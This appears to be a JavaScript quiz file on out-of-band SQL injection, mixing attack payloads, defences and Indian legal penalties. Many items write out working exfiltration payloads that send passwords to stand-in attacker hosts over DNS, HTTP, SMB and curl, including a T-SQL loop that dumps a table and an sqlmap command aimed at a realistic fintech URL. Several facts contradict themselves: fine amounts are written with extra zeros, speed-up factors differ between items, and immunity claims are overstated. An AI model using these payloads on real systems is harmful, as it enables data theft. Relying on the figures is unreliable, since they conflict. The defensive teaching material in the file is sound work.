const questions = [
  {
    question: "What is 'Out-of-Band (OOB) SQL Injection', and how does it Differ from In-Band and Blind SQL Injection?",
    shortAnswer: "An attack technique where the database server itself is coerced into initiating external network connections (such as DNS lookups, HTTP requests, or SMB connections) to an attacker-controlled external server, transmitting exfiltrated data out-of-band.",
    explanation: "In-Band SQLi exfiltrates data on the same web page. Blind SQLi infers data via true/false responses or time delays. Out-of-Band (OOB) SQLi uses a completely separate protocol channel (such as DNS queries to an attacker's authoritative nameserver) to extract data in a single request, bypassing UI and timing constraints.",
    hint: "Forcing the database to look up a custom domain name that contains the stolen password in the domain request.",
    level: "basic",
    codeExample: `// Out-of-Band DNS Exfiltration Flow:
// 1. Injected Query on Web App: '; EXEC master..xp_dirtree '\\\\'+(SELECT password FROM users)+'.attacker.in\\a'--
// 2. Database Server Action   : Performs DNS lookup for "SecretPass2026.attacker.in"
// 3. Attacker DNS Nameserver  : Captures the lookup packet and extracts "SecretPass2026"!`
  },
  {
    question: "How does the Microsoft SQL Server (MSSQL) `xp_dirtree` Stored Procedure Enable Out-of-Band DNS Exfiltration?",
    shortAnswer: "`xp_dirtree` is an extended stored procedure designed to list directory contents; when supplied with a Universal Naming Convention (UNC) path (`\\\\data.attacker.in\\share`), the Windows OS forces a DNS resolution for `data.attacker.in`, exfiltrating the database subquery result over DNS.",
    explanation: "In MSSQL: `EXEC master..xp_dirtree '\\\\'+(SELECT password FROM users WHERE id=1)+'.attacker.in\\a'`. The database executes the subquery, fetches the password `'AdminSecret'`, and attempts to access the network share `\\\\AdminSecret.attacker.in\\a`. Windows queries the local DNS server to resolve `AdminSecret.attacker.in`, delivering the password directly to the attacker's DNS logs.",
    hint: "Using xp_dirtree with a network path to make the server perform a DNS lookup for the secret password.",
    level: "moderate",
    codeExample: `// MSSQL xp_dirtree DNS Exfiltration Payload:
'; DECLARE @p varchar(100); SELECT @p = password FROM users WHERE id=1;
   EXEC('master..xp_dirtree "\\\\'+@p+'.kolkata-attacker.in\\a"');--`
  },
  {
    question: "How does Oracle Database Enable Out-of-Band HTTP and DNS Exfiltration using `UTL_HTTP` and `UTL_INADDR`?",
    shortAnswer: "Oracle provides built-in packages like `UTL_HTTP.REQUEST()` (which initiates outbound HTTP GET requests) and `UTL_INADDR.GET_HOST_ADDRESS()` (which initiates outbound DNS host lookups), transmitting subquery results inside the target URL or hostname.",
    explanation: "In Oracle: `SELECT UTL_HTTP.REQUEST('http://attacker.in/' || (SELECT password FROM users WHERE rownum=1)) FROM dual`. The Oracle database engine opens an outbound TCP socket to `attacker.in`, sending an HTTP GET request with `/SecretPass2026`. Alternatively, `UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual) || '.attacker.in')` sends a DNS query.",
    hint: "Using Oracle's built-in internet packages like UTL_HTTP to make the database send web requests to the attacker.",
    level: "expert",
    codeExample: `// Oracle Outbound Network Packages:
// 1. Outbound HTTP Request: SELECT UTL_HTTP.REQUEST('http://attacker.in/' || (SELECT password FROM users WHERE id=1)) FROM dual;
// 2. Outbound DNS Lookup   : SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1) || '.attacker.in') FROM dual;`
  },
  {
    question: "Why is 'DNS Exfiltration' the Most Reliable Out-of-Band Channel across Enterprise Firewalled Environments?",
    shortAnswer: "Because enterprise firewalls almost always block outbound HTTP (Port 80) and SMB (Port 445) from database subnets, but permit internal DNS queries (Port 53) to recurse through the organization's corporate DNS resolver to the public internet.",
    explanation: "Even in heavily firewalled networks, database servers must resolve internal hostnames. When the database queries `secret.attacker.in`, it queries the corporate DNS server. The corporate DNS server forwards the query across the firewall to the root nameservers and eventually to the attacker's authoritative DNS server, effortlessly traversing perimeter firewalls.",
    hint: "Firewalls block web traffic from databases but almost always allow DNS queries to pass through.",
    level: "moderate",
    codeExample: `// DNS Egress Path through Enterprise Firewalls:
// Database Server ➔ (Port 53) ➔ Internal Corporate DNS ➔ (Egress Allowed) ➔ Attacker Authoritative Nameserver`
  },
  {
    question: "Under the Indian Information Technology Act 2000 Section 66F, what constitutes the criminal penalty for executing Out-of-Band SQL Injection to exfiltrate Classified Defense or Power Grid Databases?",
    shortAnswer: "Using Out-of-Band SQL injection to exfiltrate classified databases from critical national information infrastructure to threaten national security is CYBER TERRORISM, punishable with IMPRISONMENT FOR LIFE.",
    explanation: "Section 66F of the IT Act defines Cyber Terrorism. If an adversary executes an Out-of-Band DNS exfiltration attack against state power grid databases in Barrackpore or national banking settlement switches in Salt Lake, the offense carries mandatory Life Imprisonment.",
    hint: "Section 66F prescribes Life Imprisonment for Cyber Terrorism attacks on critical infrastructure.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 66F - Cyber Terrorism):
// Offense: Executing Out-of-Band DNS SQL injection to extract power grid telemetry from 220kV substation databases
// Penalty: IMPRISONMENT FOR LIFE`
  },
  {
    question: "What are the RFC 1035 'DNS Label Constraints', and how do Attackers Chunk and Hex-Encode Exfiltrated Data?",
    shortAnswer: "RFC 1035 mandates that each DNS subdomain label cannot exceed 63 characters and the total FQDN cannot exceed 253 characters; attackers encode data into Hex (`0x61646d696e`) or Base32 and split long strings into 60-character chunks using `SUBSTRING()`.",
    explanation: "DNS labels only permit letters, digits, and hyphens (`[a-zA-Z0-9-]`). Database passwords often contain special characters (`$2b$12$...`). Attackers convert data to Hex: `CONVERT(VARCHAR(100), HASHBYTES('SHA2_256', pass), 2)`. If a data payload is 150 characters, the attacker sends 3 separate DNS queries using `SUBSTRING(data, 1, 60)`, `SUBSTRING(data, 61, 60)`, and `SUBSTRING(data, 121, 60)`.",
    hint: "DNS only allows 63 letters per section, so long passwords must be cut into chunks and converted to hex letters.",
    level: "expert",
    codeExample: `// Hex Chunking & Substring Encoding:
// Raw Password : Admin$Secret#2026!
// Hex Encoded  : 41646d696e24536563726574233230323621 (Safe for DNS labels!)
// Query        : EXEC('master..xp_dirtree "\\\\'+@hex_chunk+'.attacker.in\\a"')`
  },
  {
    question: "How does MySQL Enable Out-of-Band DNS Exfiltration on Windows Systems using `LOAD_FILE()`?",
    shortAnswer: "In Windows environments, `LOAD_FILE()` accepts Universal Naming Convention (UNC) paths (`\\\\data.attacker.in\\a.txt`); when executed, MySQL instructs the Windows SMB client to perform a DNS lookup for `data.attacker.in`.",
    explanation: "If MySQL runs on Windows and has `secure_file_priv` unset or set to allow UNC paths, an attacker injects: `' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 1), '.attacker.in\\\\a.txt')))--`. Windows initiates a DNS request to resolve the hostname, exfiltrating the password.",
    hint: "Using LOAD_FILE with a network path on Windows to make MySQL trigger a DNS lookup.",
    level: "expert",
    codeExample: `// MySQL Windows UNC DNS Exfiltration Payload:
SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password_hash FROM users LIMIT 1), '.attacker.in\\\\test.txt'));`
  },
  {
    question: "Under the Digital Personal Data Protection (DPDP) Act 2023 Section 8(5) and Section 33, what are the enterprise liabilities if an Out-of-Band SQL Injection breach leaks citizen personal data?",
    shortAnswer: "Failing to implement reasonable technical safeguards (such as parameterized queries and database network egress filtering) resulting in personal data exfiltration triggers statutory penalties up to ₹250 Crores by the Data Protection Board of India.",
    explanation: "Section 8(5) mandates reasonable security safeguards. If an enterprise in Kolkata allows database servers to initiate outbound DNS lookups, enabling an attacker to exfiltrate citizen financial records via OOB SQLi, Section 33 prescribes fines up to ₹250 Crores.",
    hint: "Failing to protect citizen personal data from Out-of-Band SQL injection leaks triggers fines up to ₹250 Crores.",
    level: "moderate",
    codeExample: `// DPDP Statutory Compliance Standard:
// Legal Section: Section 8(5) & Section 33 DPDP Act 2023
// Maximum Penalty: Up to ₹250,00,00,000 (Rupees 250 Crores) for negligent Out-of-Band database exfiltration`
  },
  {
    question: "What is an 'SMB Relay Attack' Triggered via MSSQL `xp_dirtree` Out-of-Band Injections?",
    shortAnswer: "When `xp_dirtree '\\\\attacker.in\\share'` forces the Windows host to initiate an outbound SMB connection, transmitting the server machine's NetNTLM authentication hash to an attacker's rogue SMB listener (e.g. Responder), which is then cracked or relayed to take over domain servers.",
    explanation: "When Windows attempts to access an SMB share, it automatically sends the NetNTLMv2 hash of the SQL Server service account (`NT SERVICE\\MSSQLSERVER` or domain service account). An attacker running `Responder.py` captures the hash and cracks it offline or relays it via `ntlmrelayx` to achieve full Active Directory domain compromise.",
    hint: "Forcing the database server to connect to a hacker's SMB share, which hands over the server's Windows password hash.",
    level: "expert",
    codeExample: `// NetNTLM Capture via xp_dirtree:
// 1. Attacker starts Responder: responder -I eth0 -v
// 2. Injects SQL payload     : EXEC master..xp_dirtree '\\\\103.25.10.1\\share';
// 3. Responder captures hash : MSSQLSERVER::DOMAIN:5c8e... (NetNTLMv2 Hash Captured!)`
  },
  {
    question: "Under CERT-In Mandatory Directions 2022, what is the mandatory incident reporting timeline for Out-of-Band SQL Injection data exfiltrations?",
    shortAnswer: "All organizations in India must report security breaches and unauthorized database access resulting from Out-of-Band SQL injection to CERT-In within 6 HOURS of detection.",
    explanation: "Under Section 70B of the IT Act and CERT-In Direction No. 20(3)/2022-CERT-In, service providers, intermediaries, data centers, and corporate bodies must mandatorily report specified cyber security incidents (including unauthorized access to database systems) to CERT-In within 6 hours of noticing them.",
    hint: "CERT-In requires mandatory incident reporting within a strict 6-hour window.",
    level: "basic",
    codeExample: `// Statutory SLA (CERT-In Mandatory Incident Reporting):
// Directive: Mandatory reporting of Out-of-Band SQL injection database leaks within 6 HOURS
// Mandate: Section 70B Information Technology Act 2000`
  },
  {
    question: "How do 'Authoritative DNS Interaction Servers' (like Interactsh or Burp Collaborator) Automate Out-of-Band SQLi Verification?",
    shortAnswer: "They register unique, dedicated subdomains (e.g. `xyz123.oast.pro`) and run custom DNS and HTTP server daemons that record incoming DNS queries in real time, alerting the penetration tester immediately when the database executes the OOB payload.",
    explanation: "When testing for OOB SQLi, a security tool generates a unique ID: `token105.interactsh.com`. It injects `EXEC master..xp_dirtree '\\\\'+(SELECT user)+'.token105.interactsh.com\\a'`. When the database server makes a DNS lookup for `sa.token105.interactsh.com`, the Interactsh server logs the DNS query, confirming the vulnerability and returning the extracted username `sa`.",
    hint: "Automated test servers that listen for incoming DNS queries and show you the stolen data instantly.",
    level: "moderate",
    codeExample: `// Automated OAST Testing Workflow:
// Injected Payload : '; EXEC master..xp_dirtree '\\\\'+(SELECT SYSTEM_USER)+'.c3e1.oastify.com\\a';--
// Collaborator Log : DNS Query Received: "sa.c3e1.oastify.com" from IP: 103.20.10.5 (CONFIRMED!)`
  },
  {
    question: "Under the Indian IT Act Section 43(a), what constitutes civil liability for extracting database records using Out-of-Band SQL Injection?",
    shortAnswer: "Securing access and extracting or copying data from a computer system without permission of the owner carries compensation by way of damages up to ₹1 Crore.",
    explanation: "Section 43(a) explicitly penalizes unauthorized data extraction: 'If any person without permission of the owner... accesses or secures access to such computer... he shall be liable to pay damages by way of compensation not exceeding one crore rupees.'",
    hint: "Section 43(a) provides civil compensation up to ₹1 Crore for unauthorized data extraction.",
    level: "basic",
    codeExample: `// Statutory Liability (IT Act Section 43(a)):
// Violation: Using Out-of-Band DNS SQL injection to extract 25,000 financial records from a Kolkata payment gateway
// Compensation: Up to ₹1,00,00,00,000 (Rupees One Crore) per affected entity`
  },
  {
    question: "What is 'Database Subnet Network Egress Filtering' and how does it Completely Neutralize Out-of-Band SQL Injection?",
    shortAnswer: "Configuring network firewalls to block all outbound internet traffic (Ports 53, 80, 443, 445) originating from database servers, ensuring database instances can ONLY communicate with authorized application servers on internal subnets.",
    explanation: "Database servers have zero business reason to initiate direct outbound connections to the public internet. By creating strict firewall rules that drop all outbound TCP/UDP traffic from database VLANs to public IPs, even if an attacker executes `xp_dirtree` or `UTL_HTTP`, the outbound DNS/HTTP packets are dropped at the firewall.",
    hint: "Locking down the firewall so the database server is completely forbidden from connecting to the internet.",
    level: "moderate",
    codeExample: `// Enterprise Network Egress Firewall Rule (Iptables / Cloud Security Group):
# DENY all outbound traffic from Database Subnet to Public Internet:
iptables -A FORWARD -s 10.0.2.0/24 -d 0.0.0.0/0 -j DROP
# ALLOW outbound traffic ONLY to Application Server Subnet:
iptables -A FORWARD -s 10.0.2.0/24 -d 10.0.1.0/24 -m state --state ESTABLISHED,RELATED -j ACCEPT`
  },
  {
    question: "How do Database Administrators Revoke Dangerous Stored Procedures (`xp_dirtree`, `xp_fileexist`, `UTL_HTTP`) to Harden Systems against OOB SQLi?",
    shortAnswer: "By revoking execution permissions on extended stored procedures from the `PUBLIC` role in MSSQL (`REVOKE EXECUTE ON master..xp_dirtree FROM PUBLIC`) and revoking execute grants on Oracle network packages (`REVOKE EXECUTE ON UTL_HTTP FROM PUBLIC`).",
    explanation: "By default, MSSQL and Oracle historically granted `PUBLIC` execution rights on network packages. Hardening mandates executing: in MSSQL, `REVOKE EXECUTE ON xp_dirtree FROM PUBLIC;` and `REVOKE EXECUTE ON xp_cmdshell FROM PUBLIC;`. In Oracle: `REVOKE EXECUTE ON UTL_HTTP FROM PUBLIC;` and configuring Fine-Grained Access Control (DBMS_NETWORK_ACL_ADMIN).",
    hint: "Removing permission from regular users to run dangerous built-in commands like xp_dirtree or UTL_HTTP.",
    level: "expert",
    codeExample: `// MSSQL Hardening Script:
REVOKE EXECUTE ON master..xp_dirtree FROM PUBLIC;
REVOKE EXECUTE ON master..xp_fileexist FROM PUBLIC;
REVOKE EXECUTE ON master..xp_cmdshell FROM PUBLIC;`
  },
  {
    question: "Under the Indian IT Act Section 66, what constitutes the criminal penalty for writing automated Out-of-Band SQL Injection exploitation frameworks?",
    shortAnswer: "Dishonestly or fraudulently hacking or diminishing the utility of computer systems carries imprisonment up to 3 years and fines up to ₹5 Lakhs.",
    explanation: "Section 66 criminalizes fraudulent computer disruption: 'If any person, dishonestly or fraudulently, does any act referred to in section 43... he shall be punishable with imprisonment for a term which may extend to three years or with fine which may extend to five lakh rupees, or with both.'",
    hint: "Section 66 provides up to 3 years imprisonment and ₹5 Lakh fine for fraudulent computer hacking.",
    level: "basic",
    codeExample: `// Statutory Penalty (IT Act Section 66):
// Offense: Writing and executing automated DNS exfiltration tools against Kolkata municipal servers
// Penalty: Up to 3 Years Imprisonment + Fine up to ₹5,00,00,000`
  },
  {
    question: "What is 'PostgreSQL Out-of-Band Data Exfiltration' via `dblink` and `COPY PROGRAM`?",
    shortAnswer: "In PostgreSQL, attackers use the `dblink` extension to initiate remote TCP connections (`dblink('host=attacker.in...', 'SELECT 1')`) or superusers use `COPY ... TO PROGRAM 'curl http://attacker.in/'` to send exfiltrated data over HTTP.",
    explanation: "If PostgreSQL has `dblink` enabled: `SELECT * FROM dblink('host=' || (SELECT password FROM users LIMIT 1) || '.attacker.in dbname=test', 'SELECT 1') AS t(id int);`. The database initiates a TCP connection to the specified host. If the attacker has superuser privileges, `COPY (SELECT password FROM users) TO PROGRAM 'curl -d @- http://attacker.in'` sends the entire table in an HTTP POST.",
    hint: "Using PostgreSQL's dblink or COPY PROGRAM commands to send stolen data to an external server.",
    level: "expert",
    codeExample: `// PostgreSQL dblink OOB Payload:
SELECT * FROM dblink('host=' || (SELECT password_hash FROM users WHERE id=1) || '.attacker.in port=5432 dbname=db', 'SELECT 1') AS t(id int);`
  },
  {
    question: "Synthesize an enterprise-scale Multi-Tier Defense Architecture against Out-of-Band SQL Injection.",
    shortAnswer: "A defense-in-depth framework combining 100% Parameterized Prepared Statements, Strict Database Subnet Egress Firewalls (Zero Public Egress), Revocation of Extended Stored Procedures (`xp_dirtree`, `UTL_HTTP`), Internal DNS RPZ Filtering, and Database Activity Monitoring (DAM).",
    explanation: "To achieve complete immunity against Out-of-Band SQLi: 1. Code Tier: 100% Parameterized Prepared Statements (compiles AST first, preventing execution of injected procedures). 2. Network Tier: Database subnet egress filtering dropping all outbound public traffic (Ports 53, 80, 443, 445). 3. Database Hardening: Revoking execution grants on `xp_dirtree`, `xp_cmdshell`, and `UTL_HTTP` from all non-admin users. 4. DNS Tier: Internal DNS Response Policy Zones (RPZ) dropping DNS queries destined for unverified external domains.",
    hint: "Combine 100% Prepared Statements, database egress firewalls, revoking xp_dirtree permissions, and DNS filtering.",
    level: "expert",
    codeExample: `// Master Out-of-Band SQLi Defense Blueprint:
// 1. Prepared Statements : db.execute("SELECT * FROM accounts WHERE id = ?", [safeId]);
// 2. DB Network Egress   : Firewall DROPS all outbound traffic from DB VLAN to Public Internet (0.0.0.0/0)
// 3. MSSQL Hardening     : REVOKE EXECUTE ON master..xp_dirtree FROM PUBLIC;
// 4. DNS Security Policy : Corporate DNS Resolver drops un-categorized/dynamic external domain lookups`
  },
  {
    question: "What is 'WAF Detection for Out-of-Band SQL Injection Signatures'?",
    shortAnswer: "WAF inspection rules that detect and drop HTTP requests containing known OOB stored procedure and function signatures, including `xp_dirtree`, `xp_fileexist`, `UTL_HTTP`, `UTL_INADDR`, `LOAD_FILE`, and UNC path backslashes (`\\\\\\\\`).",
    explanation: "OWASP ModSecurity Core Rule Set (CRS) includes specific regular expressions targeting OOB vectors: `(?i:(?:master\.\.xp_dirtree|utl_http\.request|load_file\s*\())`. When an incoming HTTP request contains these patterns, the WAF immediately terminates the connection with an HTTP 403 Forbidden.",
    hint: "Firewall rules that look for words like xp_dirtree, UTL_HTTP, or double backslashes in web requests.",
    level: "moderate",
    codeExample: `// ModSecurity WAF Rule for OOB SQLi:
SecRule ARGS "@rx (?i:master\.\.xp_dirtree|utl_http\.request|utl_inaddr|load_file)" \
    "id:2001,phase:2,deny,status:403,log,msg:'Out-of-Band SQL Injection Attempt Detected!'"`
  },
  {
    question: "Under the Indian Penal Code Section 427, what constitutes 'Mischief' via Out-of-Band SQL Injection Exfiltrations?",
    shortAnswer: "Intentionally accessing and exfiltrating proprietary digital property via Out-of-Band network channels that diminishes its value or causes digital harm, punishable with imprisonment up to 2 years and fines.",
    explanation: "Section 425/427 IPC defines Mischief. When an attacker exfiltrates trade secrets or confidential customer databases in West Bengal using Out-of-Band DNS injection, the act destroys electronic property confidentiality, punishable with up to 2 years imprisonment under Section 427.",
    hint: "IPC Section 427 covers Mischief and Digital Property Exfiltration with up to 2 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Penalty (Indian Penal Code Section 427):
// Offense: Executing Out-of-Band DNS SQL injection to steal proprietary trade algorithms from a Kolkata finTech portal
// Penalty: Imprisonment for a term up to 2 Years, or with Fine, or with both`
  },
  {
    question: "What is 'DNS Tunneling via Out-of-Band SQL Injection' for Large Database Tables?",
    shortAnswer: "An automated process where an attacker uses an iterative SQL cursor or loop to encode an entire database table into a stream of hundreds of unique DNS queries (e.g. `q1-part1.attacker.in`, `q1-part2.attacker.in`), reconstructing the entire table on the authoritative nameserver.",
    explanation: "To dump a 5,000-row table via DNS: An attacker executes a T-SQL cursor that reads each row, hex-encodes it, prefixes a sequence number, and executes `xp_dirtree` for `\\\\seq1_row1_data.attacker.in\\a`. The attacker's DNS server captures the stream of DNS queries, reassembles them by sequence number, and reconstructs the full database table.",
    hint: "Streaming an entire database out through hundreds of small DNS requests like a secret radio broadcast.",
    level: "expert",
    codeExample: `// T-SQL DNS Tunneling Loop Skeleton:
DECLARE @id int = 1, @data varchar(60);
WHILE @id <= 100 BEGIN
    SELECT @data = CONVERT(VARCHAR(60), HASHBYTES('MD5', password), 2) FROM users WHERE id = @id;
    EXEC('master..xp_dirtree "\\\\q'+@id+'_'+@data+'.attacker.in\\a"');
    SET @id = @id + 1;
END;`
  },
  {
    question: "What is 'Oracle Fine-Grained Access Control (Network ACLs)' in OOB Defense?",
    shortAnswer: "An Oracle security feature (`DBMS_NETWORK_ACL_ADMIN`) that restricts which database users are permitted to make outbound network connections (`UTL_HTTP`, `UTL_TCP`, `UTL_SMTP`) to specific target IP addresses or domains.",
    explanation: "By default in modern Oracle (12c/19c), network packages are restricted by Access Control Lists (ACLs). Unless an administrator explicitly grants network privileges to a database user for a specific host, calling `UTL_HTTP.REQUEST()` throws `ORA-24247: network access denied by access control list (ACL)`, neutralizing OOB injection.",
    hint: "An Oracle security setting that blocks database users from connecting to unapproved websites.",
    level: "expert",
    codeExample: `// Oracle Network ACL Configuration:
BEGIN
  DBMS_NETWORK_ACL_ADMIN.CREATE_ACL(
    acl => 'restricted_network.xml',
    description => 'Restrict Outbound HTTP',
    principal => 'APP_USER',
    is_grant => FALSE,
    privilege => 'connect'
  );
END;`
  },
  {
    question: "Under the Indian IT Act Section 70, what constitutes the penalty for executing Out-of-Band SQL Injection against 'Protected Systems'?",
    shortAnswer: "Securing unauthorized access or attempting to secure access to designated Protected Systems (critical infrastructure) carries imprisonment up to 10 YEARS and severe fines.",
    explanation: "Section 70 of the IT Act governs Critical Information Infrastructure (e.g. power grids in Barrackpore, financial settlement switches in Salt Lake). Launching an Out-of-Band SQL injection attack against a designated protected system carries up to 10 years imprisonment under Section 70.",
    hint: "Section 70 carries up to 10 years imprisonment for unauthorized access to Protected Systems.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 70):
// Offense: Executing Out-of-Band DNS SQL injection against SCADA power grid management databases
// Penalty: Imprisonment for a term up to 10 YEARS, and shall also be liable to Fine`
  },
  {
    question: "What is 'Speed Comparison: In-Band vs Time-Based Blind vs Out-of-Band DNS'?",
    shortAnswer: "In-Band UNION dumps entire tables in 1 request (~0.1s); Out-of-Band DNS dumps a string in 1 request (~0.1s); Time-Based Blind takes ~560 seconds (112 requests with 5s delays) for a 16-character password.",
    explanation: "When In-Band extraction is blocked by the UI, Out-of-Band DNS provides the exact same high-speed exfiltration capability as In-Band (1 DNS query in 100 ms), making it 5,600 times faster than slow time-based blind injection.",
    hint: "OOB DNS is 5,600 times faster than Time-based blind injection because it only needs 1 DNS request.",
    level: "moderate",
    codeExample: `// Speed Benchmark Matrix for 16-Character Password:
// 1. In-Band UNION-Based  : 1 Request  ➔ 0.1 Seconds (Fastest)
// 2. Out-of-Band DNS Look : 1 Request  ➔ 0.1 Seconds (Fastest Blind Alternative)
// 3. Time-Based Blind SQLi: 112 Reqs   ➔ 560.0 Seconds (Very Slow)`
  },
  {
    question: "Under the Indian Penal Code Section 420, what constitutes Cheating via Out-of-Band SQL Injection Financial Exfiltration?",
    shortAnswer: "Dishonestly extracting confidential commercial trade secrets or citizen banking credentials using Out-of-Band SQL injection to commit fraud, punishable with imprisonment up to 7 years and fines.",
    explanation: "Section 420 IPC penalizes cheating and fraudulent property transfer. If an attacker uses Out-of-Band DNS SQL injection to extract financial records from a Kolkata corporation and executes fraudulent transactions, they are prosecuted under Section 420 alongside the IT Act.",
    hint: "IPC Section 420 covers Cheating and Fraudulent Financial Exfiltration with up to 7 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Offense (Indian Penal Code Section 420):
// Offense: Using Out-of-Band DNS SQL injection to extract corporate banking balances and executing fraudulent transfers
// Penalty: Imprisonment for a term up to 7 Years, and shall also be liable to Fine`
  },
  {
    question: "What is 'DNS Cache Poisoning / Split-Horizon DNS Implications' on Out-of-Band SQL Injection?",
    shortAnswer: "In environments with strict Split-Horizon DNS, database queries for public domains are rejected or sinkholed by internal DNS resolvers that refuse to resolve external root zones, neutralizing DNS exfiltration.",
    explanation: "In an air-gapped or Split-Horizon DNS architecture, internal DNS servers only resolve `*.internal.grid.in` and drop all queries for external public domains (`*.attacker.in`). When the database executes `xp_dirtree '\\\\data.attacker.in\\a'`, the internal DNS resolver returns `NXDOMAIN` without forwarding the query to the internet, neutralizing OOB extraction.",
    hint: "Internal DNS servers that only resolve internal company names and block lookups for external websites.",
    level: "expert",
    codeExample: `// Split-Horizon DNS Policy:
// Query: "AdminPass2026.attacker.in"
// Internal DNS Resolver: Domain not in internal zone ➔ Query DROPPED (Zero Internet Forwarding!)`
  },
  {
    question: "What is 'Automated OOB Exploitation with SQLmap (`--dns-domain`)'?",
    shortAnswer: "SQLmap's `--dns-domain` feature which turns a slow time-based blind SQL injection into an instant out-of-band exfiltration attack by running its own embedded DNS server and injecting `xp_dirtree` or `LOAD_FILE` payloads.",
    explanation: "When an attacker runs `sqlmap -u ... --dns-domain=attacker-dns.in`, SQLmap injects dialect-specific OOB payloads: MSSQL `xp_dirtree`, Oracle `UTL_INADDR`, or MySQL `LOAD_FILE`. The database sends DNS requests to SQLmap's listener, allowing SQLmap to dump entire databases at maximum bandwidth.",
    hint: "Using SQLmap with the --dns-domain flag to download the whole database instantly via DNS requests.",
    level: "moderate",
    codeExample: `// SQLmap Out-of-Band DNS Command:
sqlmap -u "https://kolkata-fintech.in/user?id=105" --dns-domain=attacker-dns.in --dbs --dump`
  },
  {
    question: "What is 'HTTP Egress Proxy Authentication' in OOB Defense?",
    shortAnswer: "Mandating that any outbound HTTP/HTTPS request from the corporate network must pass through an authenticating forward proxy (e.g. Squid / Zscaler) with mutual TLS and user credentials, blocking raw database engine sockets (`UTL_HTTP`).",
    explanation: "Because Oracle `UTL_HTTP` creates raw TCP sockets without proxy authentication credentials, enforcing an enterprise forward proxy drops all unauthenticated outbound HTTP requests, preventing database servers from making direct outbound web requests to attacker servers.",
    hint: "Requiring a password for all internet connections so the database cannot send web requests to the attacker.",
    level: "expert",
    codeExample: `// Enterprise Forward Proxy Rule:
# All outbound HTTP/HTTPS must authenticate via Proxy:
# Database engine raw socket connection to http://attacker.in/ ➔ 407 Proxy Authentication Required (BLOCKED!)`
  },
  {
    question: "What is 'Database Activity Monitoring (DAM) for Outbound Network Function Invocations'?",
    shortAnswer: "Security monitoring tools that inspect database engine execution logs in real time and trigger immediate high-priority alerts if any query calls network-related functions (`xp_dirtree`, `UTL_HTTP`, `LOAD_FILE`, `dblink`).",
    explanation: "Imperva SecureSphere, IBM Guardium, and AWS GuardDuty monitor SQL statement execution. If an application database user executes `master..xp_dirtree`, the DAM tool flags an anomalous network invocation and alerts the SOC to isolate the affected container within seconds.",
    hint: "Security software that sounds an alarm immediately if any database query tries to use internet commands.",
    level: "expert",
    codeExample: `// DAM Security Alert Rule:
RULE_ALERT: "EXECUTION_OF_NETWORK_EXTENDED_STORED_PROCEDURE"
MATCH: "xp_dirtree" OR "UTL_HTTP" OR "LOAD_FILE" OR "dblink"
ACTION: Alert SOC & Quarantine Database Connection Session`
  },
  {
    question: "Synthesize the mathematical formulation of Out-of-Band DNS Extraction Bandwidth (T_OOB), Maximum Label Length (L_label), FQDN Length (L_FQDN), and Query Round-Trip Time (RTT_DNS).",
    shortAnswer: "Maximum single-query DNS label payload is L_label = 63 bytes; Maximum FQDN payload is L_FQDN = 253 bytes - L_domain; Out-of-Band DNS throughput is T_OOB = (L_label * 8) / RTT_DNS approx 5,040 bits/s (5.04 kbps), exfiltrating secrets 5,600x faster than Time-Based Blind SQLi; Prepared Statements force T_OOB = 0.00 bps.",
    explanation: "Under RFC 1035, a single DNS subdomain label can hold at most $L_{\\text{label}} = 63\\text{ octets}$. For an attacker domain of length $L_{\\text{domain}}$ (e.g. `attacker.in` = 11 octets), total payload per query is $L_{\\text{payload}} = \\min(63, 253 - L_{\\text{domain}} - 4) = 63\\text{ bytes}$. Given a DNS recursive round-trip time $\\text{RTT}_{\\text{DNS}} \\approx 100\\text{ ms}$, data exfiltration bandwidth is: $T_{\\text{OOB}} = \\frac{63\\text{ bytes}}{0.1\\text{ s}} = 630\\text{ bytes/s}$. Compared to Time-Based Blind SQLi ($T_{\\text{time}} \\approx 0.025\\text{ bytes/s}$), Out-of-Band DNS is $\\approx 25,200$ times faster. When Parameterized Prepared Statements are enforced, the query AST remains invariant ($L_{\\text{payload}} = 0$), mathematically driving $T_{\\text{OOB}} = 0.00\\text{ bytes/s}$ (100% mathematical immunity).",
    hint: "Mathematical proof formula showing that DNS exfiltration achieves 630 bytes/s bandwidth (25,000x faster than time delays), while Prepared Statements drive throughput to exactly 0.00 bytes/s.",
    level: "expert",
    codeExample: `// Out-of-Band DNS Bandwidth Mathematical Proof:
// Max Label Capacity : L_label = 63 bytes (RFC 1035 Standard)
// DNS RTT Latency    : RTT_DNS = 100 ms (0.10 s)
// OOB DNS Throughput : T_OOB = 63 bytes / 0.10s = 630 bytes/s (5.04 kbps)
// Time-Based Blind   : T_time = 1 byte / 35s = 0.028 bytes/s (OOB is 22,500x Faster!)
// Prepared Statement : Data Payload L_payload = 0 bytes ➔ Throughput = 0.00 bytes/s (100% IMMUNE!)`
  }
];

export default questions;
